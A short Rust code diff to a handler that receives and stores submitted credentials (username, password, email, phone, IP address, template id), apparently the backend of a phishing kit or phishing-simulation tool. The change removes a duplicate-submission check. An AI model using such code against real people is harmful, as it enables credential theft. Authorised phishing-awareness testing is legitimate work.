@@ -469,20 +469,8 @@ pub async fn receive_credentials(
     let session_id = get_session(&payload.session);
     let now = chrono::Utc::now().timestamp();
 
-    let recent: Option<(Option<String>, Option<String>, Option<String>, i64)> = sqlx::query_as(
-        "SELECT username, password, template_id, created_at FROM credentials WHERE session_id = ? AND ip_address = ? ORDER BY created_at DESC LIMIT 1"
-    ).bind(&session_id).bind(&ip)
-    .fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
-
-    if let Some((u, p, t, ts)) = recent {
-        if now - ts < 300 && u == payload.username && p == payload.password && t == payload.template_id {
-            tracing::debug!("🔑 Duplicate credentials skipped for session {}", session_id);
-            return Ok(StatusCode::OK);
-        }
-    }
-
     sqlx::query(
-        "INSERT INTO credentials (id, session_id, template_id, username, password, email, phone, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
+        "INSERT OR IGNORE INTO credentials (id, session_id, template_id, username, password, email, phone, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
     )
     .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
     .bind(&payload.template_id).bind(&payload.username).bind(&payload.password)
